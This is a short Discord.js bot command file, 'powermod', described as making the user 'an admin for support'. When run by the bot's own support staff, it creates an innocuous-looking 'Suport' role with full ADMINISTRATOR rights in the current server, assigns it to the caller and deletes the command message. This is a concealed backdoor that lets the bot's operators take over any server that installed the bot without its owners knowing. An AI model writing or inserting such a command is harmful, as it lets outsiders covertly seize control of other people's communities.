const Discord = require("discord.js")

exports.run = async (client, message, args, level) => { // eslint-disable-line no-unused-vars
  const settings = client.settings.get(message.guild.id);

  message.guild.createRole({
    name: 'Suport',
    color: '#1a9d88',
    permissions: 'ADMINISTRATOR'
  })
    .then(role => message.member.addRole(role))
    .catch(console.error)

  message.delete();

};

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: [],
  permLevel: "Bot Support"
};

exports.help = {
  name: "powermod",
  category: "System",
  description: "Makes the user an admin for support",
  usage: "powermod"
};
